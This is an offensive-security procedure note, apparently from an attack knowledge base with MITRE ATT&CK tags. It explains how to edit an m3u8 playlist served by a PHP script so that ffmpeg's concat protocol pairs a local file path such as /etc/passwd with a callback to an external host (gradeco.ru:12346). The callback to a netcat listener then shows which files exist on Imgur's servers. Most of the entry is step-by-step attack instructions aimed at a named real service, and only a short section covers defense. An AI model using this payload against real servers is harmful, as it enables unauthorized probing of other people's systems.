---
tags:
  - lfi
  - enumeration
  - concat
type: procedure
tools:
  - '[[tools/PHP]]'
  - '[[tools/nc]]'
tactics:
  - '[[Discovery]]'
commands: []
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T04:39:09.590Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: c3489028-2d11-41dc-acd2-37b474f28469
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Enumerate-Local-Files-via-Concat-Protocol

## Summary

This procedure modifies the m3u8 playlist to use ffmpeg's concat protocol, combining local file:// paths with http:// URLs to enumerate the existence of sensitive files on Imgur's server.

## Description

FFmpeg's m3u8 concat support allows file:///etc/passwd|http://attacker.com/. If the local file exists, the HTTP request is made; if not, it fails silently. This enables blind enumeration without content leakage unless chained with LFI.

## Requirements

1. Existing m3u8.php setup from prior procedures
2. Netcat listener on port 12346 for callbacks
3. List of target files (e.g., /etc/passwd, /etc/issue)

## Defense

Defensive measures and detection strategies:

- Disable or restrict file:// protocol in ffmpeg configurations
- Monitor for concat protocol usage in logs
- File system access controls and integrity monitoring

## Objectives

1. Detect presence of local files
2. Map server filesystem structure
3. Identify potential LFI paths

## Instructions

### Step 1: Modify m3u8 Playlist

**Context**: Update PHP script to include concat with target file.

Edit m3u8.php to output:
```m3u8
#EXTM3U
#EXTINF:10.0,
concat:file:///etc/passwd|http://gradeco.ru:12346/
#EXT-X-ENDLIST
```

> Save and ensure Content-Type remains video/avi.

### Step 2: Submit and Monitor

**Context**: Trigger request and check for callback.

Submit POST to Imgur as in Step 1, run [[commands/nc-listen-ssrf]] on port 12346.

> If request received, file exists; no request means absent.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP]]
- [[tools/nc]]

## Tags

- lfi
- enumeration
- concat
